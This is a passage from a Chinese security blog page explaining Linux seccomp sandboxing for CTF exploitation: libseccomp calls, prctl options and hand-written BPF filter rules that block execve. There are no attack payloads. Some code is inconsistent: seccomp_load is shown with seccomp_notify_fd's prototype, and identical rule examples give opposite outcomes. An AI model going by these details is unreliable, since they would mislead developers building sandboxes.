<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/page/6/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/6/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/Seccomp_Before/">Seccomp_Before</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常见Seccomp：</p>
<p>(1)库安装：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></div></figure>

<p>(2)正常的使用seccopm开启：</p>
<p>①先创建初始化scmp_filter_ctx结构体，并且给定初始规则：</p>
<p>scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);</p>
<p>这里将初始规则设置为SCMP_ACT_ALLOW，即允许所有的系统调用。另有规则如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Kill the process</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_KILL_PROCESS 0x80000000U</span><br><span class="line">/**</span><br><span class="line">* Kill the thread</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_KILL_THREAD 0x00000000U</span><br><span class="line">/**</span><br><span class="line">* Kill the thread, defined for backward compatibility</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_KILL SCMP_ACT_KILL_THREAD</span><br><span class="line">/**</span><br><span class="line">* Throw a SIGSYS signal</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_TRAP 0x00030000U</span><br><span class="line">/**</span><br><span class="line">* Notifies userspace</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_NOTIFY 0x7fc00000U</span><br><span class="line">/**</span><br><span class="line">* Return the specified error code</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_ERRNO(x) (0x00050000U | ((x) &amp; 0x0000ffffU))</span><br><span class="line">/**</span><br><span class="line">* Notify a tracing process with the specified value</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_TRACE(x) (0x7ff00000U | ((x) &amp; 0x0000ffffU))</span><br><span class="line">/**</span><br><span class="line">* Allow the syscall to be executed after the action has been logged</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_LOG 0x7ffc0000U</span><br><span class="line">/**</span><br><span class="line">* Allow the syscall to be executed</span><br><span class="line">*/</span><br><span class="line">#define SCMP_ACT_ALLOW 0x7fff0000U</span><br><span class="line"></span><br><span class="line">/* SECCOMP_RET_USER_NOTIF was added in kernel v5.0. */</span><br><span class="line">#ifndef SECCOMP_RET_USER_NOTIF</span><br><span class="line">#define SECCOMP_RET_USER_NOTIF 0x7fc00000U</span><br></pre></td></tr></table></div></figure>

<p>②添加规则，即添加白名单或者黑名单：</p>
<p>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</p>
<p>这里将系统调用execve给禁止了。函数原型：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Add a new rule to the filter</span><br><span class="line">* @param ctx the filter context</span><br><span class="line">* @param action the filter action</span><br><span class="line">* @param syscall the syscall number</span><br><span class="line">* @param arg_cnt the number of argument filters in the argument filter chain</span><br><span class="line">* @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)</span><br><span class="line">*</span><br><span class="line">* This function adds a series of new argument/value checks to the seccomp</span><br><span class="line">* filter for the given syscall; multiple argument/value checks can be</span><br><span class="line">* specified and they will be chained together (AND&#x27;d together) in the filter.</span><br><span class="line">* If the specified rule needs to be adjusted due to architecture specifics it</span><br><span class="line">* will be adjusted without notification. Returns zero on success, negative</span><br><span class="line">* values on failure.</span><br><span class="line">*</span><br><span class="line">*/</span><br><span class="line">int seccomp_rule_add(scmp_filter_ctx ctx,</span><br><span class="line">uint32_t action, int syscall, unsigned int arg_cnt, ...);</span><br></pre></td></tr></table></div></figure>

<p>即(结构体，规则，规则生效的系统调用，arg_cnt，scmp_arg_cmp)。</p>
<p>A.其中arg_cnt表示函数seccomp_rule_add后面传入参数的个数，如果为0，则直接禁止execve，后面的scmp_arg_cmp都不用赋值，赋值了也没用。</p>
<p>B.如果不为0，则再看之后seccomp_rule_add函数之后传入的参数，赋值为1，则只允许一条规则。赋值为2，则需同时满足之后的两条规则才会生效。例如：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">//从0开始计算参数个数</span><br><span class="line">seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),1,</span><br><span class="line">        SCMP_A2(SCMP_CMP_EQ,0x10));</span><br><span class="line">write(1,&quot;1234567812345678&quot;,0x10);//被拦截</span><br><span class="line"></span><br><span class="line">seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,</span><br><span class="line">        SCMP_A2(SCMP_CMP_EQ,0x10));</span><br><span class="line">write(1,&quot;1234567812345678&quot;,0x10);//不被拦截</span><br><span class="line">//seccomp_rule_add参数个数设置为2，但是后续没有添加规则，则默认不满足，则不会生效</span><br><span class="line"></span><br><span class="line">seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,</span><br><span class="line">        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));</span><br><span class="line">write(1,&quot;1234567812345678&quot;,0x10);//被拦截</span><br><span class="line"></span><br><span class="line">seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,</span><br><span class="line">        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));</span><br><span class="line">write(1,&quot;1234567812345678&quot;,0x10);//不被拦截</span><br></pre></td></tr></table></div></figure>

<p>但是使用seccomp，一旦被拦截，则程序直接打印错误信息并中断，无法执行之后的代码，规则如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Specify an argument comparison struct for use in declaring rules</span><br><span class="line">* @param arg the argument number, starting at 0</span><br><span class="line">* @param op the comparison operator, e.g. SCMP_CMP_*</span><br><span class="line">* @param datum_a dependent on comparison</span><br><span class="line">* @param datum_b dependent on comparison, optional</span><br><span class="line">*/</span><br><span class="line">#define SCMP_CMP(...) ((struct scmp_arg_cmp)&#123;__VA_ARGS__&#125;)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Specify an argument comparison struct for argument 0</span><br><span class="line">*/</span><br><span class="line">#define SCMP_A0(...) SCMP_CMP(0, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Specify an argument comparison struct for argument 1</span><br><span class="line">*/</span><br><span class="line">#define SCMP_A1(...) SCMP_CMP(1, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Specify an argument comparison struct for argument 2</span><br><span class="line">*/</span><br><span class="line">#define SCMP_A2(...) SCMP_CMP(2, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Specify an argument comparison struct for argument 3</span><br><span class="line">*/</span><br><span class="line">#define SCMP_A3(...) SCMP_CMP(3, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Specify an argument comparison struct for argument 4</span><br><span class="line">*/</span><br><span class="line">#define SCMP_A4(...) SCMP_CMP(4, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Specify an argument comparison struct for argument 5</span><br><span class="line">*/</span><br><span class="line">#define SCMP_A5(...) SCMP_CMP(5, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Comparison operators</span><br><span class="line">*/</span><br><span class="line">enum scmp_compare &#123;</span><br><span class="line">_SCMP_CMP_MIN = 0,</span><br><span class="line">SCMP_CMP_NE = 1, /**&lt; not equal */</span><br><span class="line">SCMP_CMP_LT = 2, /**&lt; less than */</span><br><span class="line">SCMP_CMP_LE = 3, /**&lt; less than or equal */</span><br><span class="line">SCMP_CMP_EQ = 4, /**&lt; equal */</span><br><span class="line">SCMP_CMP_GE = 5, /**&lt; greater than or equal */</span><br><span class="line">SCMP_CMP_GT = 6, /**&lt; greater than */</span><br><span class="line">SCMP_CMP_MASKED_EQ = 7, /**&lt; masked equality */</span><br><span class="line">_SCMP_CMP_MAX,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Argument datum</span><br><span class="line">*/</span><br><span class="line">typedef uint64_t scmp_datum_t;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Argument / Value comparison definition</span><br><span class="line">*/</span><br><span class="line">struct scmp_arg_cmp &#123;</span><br><span class="line">unsigned int arg; /**&lt; argument number, starting at 0 */</span><br><span class="line">enum scmp_compare op; /**&lt; the comparison op, e.g. SCMP_CMP_* */</span><br><span class="line">scmp_datum_t datum_a;</span><br><span class="line">scmp_datum_t datum_b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>③启用seccomp保护：</p>
<p>seccomp_load(ctx);</p>
<p>利用seccomp_load函数加载启用保护。函数原型：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Return the notification fd from a filter that has already been loaded</span><br><span class="line">* @param ctx the filter context</span><br><span class="line">*</span><br><span class="line">* This returns the listener fd that was generated when the seccomp policy was</span><br><span class="line">* loaded. This is only valid after seccomp_load() with a filter that makes</span><br><span class="line">* use of SCMP_ACT_NOTIFY.</span><br><span class="line">*</span><br><span class="line">*/</span><br><span class="line">int seccomp_notify_fd(const scmp_filter_ctx ctx);</span><br></pre></td></tr></table></div></figure>

<p>这里传入scmp_filter结构体即可，如果不传入</p>
<p>以上的均可在seccomp.h中查看。</p>
<p>▲总的调用就是：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</span><br><span class="line">seccomp_load(ctx);</span><br></pre></td></tr></table></div></figure>

<p>记得引用库：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#include &lt;seccomp.h&gt;</span><br><span class="line">#include &lt;linux/seccomp.h&gt;</span><br></pre></td></tr></table></div></figure>

<p>2.Prtctl函数(/usr/includ/linux/prctl.h)：</p>
<p>原型：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);</span><br></pre></td></tr></table></div></figure>

<p>这里的参数可以不需要全部设置上，其中option比较关键，在PWN中大致分以下情况：</p>
<p>(1)若option为PR_SET_NO_NEW_PRIVS(38)：</p>
<p>此时将第二个参数arg2设置为1，那么程序的子线程就无法通过execve来提权，就是pwn kernel中即使改掉了cred结构体，使其特权为0，再执行system(“/bin/sh”)依然无法提权。即prctl(38, 1,0,0,0)表示禁用系统调用，也就是system和onegadget都没了，同时子进程也无法这样来获得shell。</p>
<p>(2)若option为PR_SET_SECCOMP(22)：</p>
<p>此时可以通过参数来设置规则，道理和seccomp一样的，规则如下：</p>
<p>①如果arg2为SECCOMP_MODE_STRICT(1),则只允许调用read,write,_exit(这个exit不是退出程序的意思),sigreturn这几个syscall。即prctl(22,1,0,0,0)。</p>
<p>②如果arg2为SECCOMP_MODE_FILTER(2),则为过滤模式,其中对syscall的限制通过参数3的结构体，来自定义过滤规则，函数会重定向到另一个同名函数，该函数的原型如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int prctl(int PR_SET_SECCOMP,const struct* sock_filter SECCOMP_MODE_FILTER,const sock_fprog prog);</span><br></pre></td></tr></table></div></figure>

<p>但调用之前还是需要禁用execve，即调用形式为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);   //这里是需要这么写的</span><br><span class="line">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);</span><br></pre></td></tr></table></div></figure>

<p>A.参数SECCOMP_MODE_FILTER是一个结构体数组，该sock_filter结构体为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct sock_filter &#123; /* Filter block */</span><br><span class="line">__u16 code; /* Actual filter code */</span><br><span class="line">__u8 jt; /* Jump true */</span><br><span class="line">__u8 jf; /* Jump false */</span><br><span class="line">__u32 k; /* Generic multiuse field */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>a.code:一个字节，详细定义操作的类型，假设code为0x15</p>
<p>先看前四位：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#define BPF_CLASS(code)</span><br><span class="line">#define BPF_LD 0x00 </span><br><span class="line">#define BPF_LDX 0x01</span><br><span class="line">#define BPF_ST 0x02</span><br><span class="line">#define BPF_STX 0x03</span><br><span class="line">#define BPF_ALU 0x04</span><br><span class="line">#define BPF_JMP 0x05</span><br><span class="line">#define BPF_RET 0x06</span><br><span class="line">#define BPF_MISC 0x07</span><br></pre></td></tr></table></div></figure>

<p>这里前四位就是0x5，所以对应到之后的四位定义域中去：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">/*jmp fields */</span><br><span class="line">#define BPF_JA 0x00 </span><br><span class="line">#define BPF_JEQ 0x10</span><br><span class="line">#define BPF_JGT 0x20</span><br><span class="line">#define BPF_JGE 0x30</span><br><span class="line">#define BPF_JSET 0x40</span><br><span class="line">#define BPF_SRC(code) ((code) &amp; 0x08)</span><br></pre></td></tr></table></div></figure>

<p>那么这个0x15的操作就是BPF_JMP+BPF_JEQ。</p>
<p>▲同理，ld、ldx、ALU都有对应的定义域：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">/*ld fields */</span><br><span class="line">#define BPF_W 0x00</span><br><span class="line">#define BPF_H 0x08</span><br><span class="line">#define BPF_B 0x10</span><br><span class="line"></span><br><span class="line">/*ldx fields */  </span><br><span class="line">#define BPF_IMM 0x00</span><br><span class="line">#define BPF_ABS 0x20</span><br><span class="line">#define BPF_IND 0x40</span><br><span class="line">#define BPF_MEM 0x60</span><br><span class="line">#define BPF_LEN 0x80</span><br><span class="line">#define BPF_MSH 0xa0</span><br><span class="line"></span><br><span class="line">/*alu fields */</span><br><span class="line">#define BPF_ADD 0x00</span><br><span class="line">#define BPF_SUB 0x10</span><br><span class="line">#define BPF_MUL 0x20</span><br><span class="line">#define BPF_DIV 0x30</span><br><span class="line">#define BPF_OR 0x40</span><br><span class="line">#define BPF_AND 0x50</span><br><span class="line">#define BPF_LSH 0x60</span><br><span class="line">#define BPF_RSH 0x70</span><br><span class="line">#define BPF_NEG 0x80</span><br><span class="line">#define BPF_MOD 0x90</span><br><span class="line">#define BPF_XOR 0xa0</span><br><span class="line"></span><br><span class="line">/*常数*/</span><br><span class="line">#define BPF_K 0x00</span><br><span class="line">#define BPF_X 0x08</span><br></pre></td></tr></table></div></figure>

<p>而RET一般对应BPF_K，然后在之后参数上写SECCOMP_RET_KILL或者SECCOMP_RET_ALLOW。MISC倒是没见过。</p>
<p>b.JT和JF：是相对于当前语句的偏移。例如(1,0)，假设当前语句为0003，则代表之前语句为真，则跳转到0005，为假则跳转到0004。所以如果都是0，相当于是个无跳转语句，如果都是1，相当于是跳过下一条语句。</p>
<p>c.K：可以当作一个参数。如果操作语句是比较，那么就相当于比较的右值A&gt;=K？。以此类推。这个参数的值是从seccomp_data中：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">(&lt;linux/audit.h&gt; ) </span><br><span class="line">struct seccomp_data &#123;</span><br><span class="line">int nr; /* System call number */</span><br><span class="line">__u32 arch; /* AUDIT_ARCH_* value*/</span><br><span class="line">__u64 instruction_pointer; /* CPU instruction pointer */</span><br><span class="line">__u64 args[6]; /* Up to 6 system call arguments */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>值即代表偏移，偏移字长为一个字节：</p>
<p>K==0，代表nr；K==4，代表arch；K==8，代表args[0]。而args六个值相当于传参寄存器的值：ebx,ecx,edx,esi,edi,ebp(32位)，rdi,rsi,rdx,r10,r8,r9(64位)</p>
<p>▲所以(0x15,0x00,0x01,0x0000003b)就代表if (A!= execve) goto offset_1。这里也可以用一个简单的操作来替代：BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1)。定义规则就可以如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct sock_filter sfi[] = &#123;</span><br><span class="line">&#123;0x20,0x00,0x00,0x00000000&#125;,</span><br><span class="line">&#123;0x15,0x00,0x01,0xc000003b&#125;,</span><br><span class="line">&#123;0x06,0x00,0x00,0x00000000&#125;,   //KILL</span><br><span class="line">&#123;0x06,0x00,0x00,0x7fff0000&#125;   //ALLOW</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>或者</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct sock_filter filter[] = &#123;</span><br><span class="line">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), </span><br><span class="line">BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), </span><br><span class="line">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), </span><br><span class="line">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>由于在/usr/include/linux/bpf_common.h有宏定义，所以第二种情况也是可以的。</p>
<p>B.sfp也是一个结构体：</p>
